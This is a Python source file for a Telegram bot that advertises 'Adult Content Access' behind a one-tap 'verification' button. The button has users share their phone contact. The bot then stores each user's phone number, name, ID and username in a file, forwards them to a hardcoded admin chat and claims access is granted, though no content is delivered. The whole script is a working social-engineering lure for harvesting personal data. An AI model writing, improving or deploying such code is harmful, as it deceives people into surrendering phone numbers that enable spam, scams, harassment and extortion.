import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
import datetime
import os

# Load bot token from environment variable
BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

# Set admin chat ID (from @userinfobot)
ADMIN_CHAT_ID = "5944513375"

# Create a cross-platform data directory
DATA_DIR = "bot_data"
os.makedirs(DATA_DIR, exist_ok=True)
USER_DATA_FILE = os.path.join(DATA_DIR, "user_data.txt")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Send welcome message with one-click verification button"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("📲 VERIFY NOW", request_contact=True))

    bot.send_message(
        message.chat.id,
        "🔞 Adult Content Access\n\n"
        "ONE-STEP VERIFICATION:\n"
        "1. Tap button below\n"
        "2. Verify your account\n"
        "3. Instant access!",
        reply_markup=markup
    )

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Process contact and notify admin"""
    contact = message.contact
    user = message.from_user

    # Ensure contact is from the sender (prevents spoofing)
    if contact.user_id != user.id:
        bot.send_message(
            message.chat.id,
            "❌ You must verify using *your own* number.",
            parse_mode="Markdown"
        )
        return

    # Check if user is already verified
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r", encoding='utf-8') as f:
            if str(user.id) in f.read():
                bot.send_message(message.chat.id, "✅ You're already verified.")
                return

    # Format and save user info
    user_entry = (
        f"\n[{datetime.datetime.now()}]\n"
        f"👤 {user.first_name} {user.last_name or ''}\n"
        f"📱 {contact.phone_number}\n"
        f"🆔 {user.id}\n"
        f"🌐 @{user.username or 'no_username'}\n"
    )

    with open(USER_DATA_FILE, "a", encoding='utf-8') as f:
        f.write(user_entry)

    # User confirmation
    bot.send_message(
        message.chat.id,
        f"✅ VERIFIED: {user.first_name}\n"
        f"📞 {contact.phone_number}\n\n"
        "Access granted!",
        reply_markup=ReplyKeyboardRemove()
    )

    # Admin notification
    admin_msg = (
        f"🚨 NEW VERIFICATION\n{user_entry}"
    )
    if user.username:
        admin_msg += f"\nChat: https://t.me/{user.username}"

    bot.send_message(ADMIN_CHAT_ID, admin_msg)

if __name__ == '__main__':
    print("📱 Bot running on Render...")
    print(f"📂 Data file: {USER_DATA_FILE}")
    bot.polling(non_stop=True)
